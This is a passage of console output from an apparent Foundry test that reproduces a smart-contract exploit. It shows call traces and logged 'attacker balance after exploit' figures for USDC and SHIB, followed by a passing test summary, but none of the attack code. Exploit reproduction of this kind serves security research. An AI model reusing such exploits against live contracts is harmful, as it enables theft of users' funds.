    │   ├─ [2381] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::decimals() [delegatecall]
    │   │   └─ ← [Return] 6
    │   └─ ← [Return] 6
    ├─ emit log_named_decimal_uint(key: "Attacker USDC balance after exploit", val: 1900052720 [1.9e9], decimals: 6)
    ├─ [639] SHIB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 238807361821278282381675116 [2.388e26]
    ├─ [2438] SHIB::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker SHIB balance after exploit", val: 238807361821278282381675116 [2.388e26], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.50s (5.13s CPU time)

Ran 2 test suites in 5.89s (5.82s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
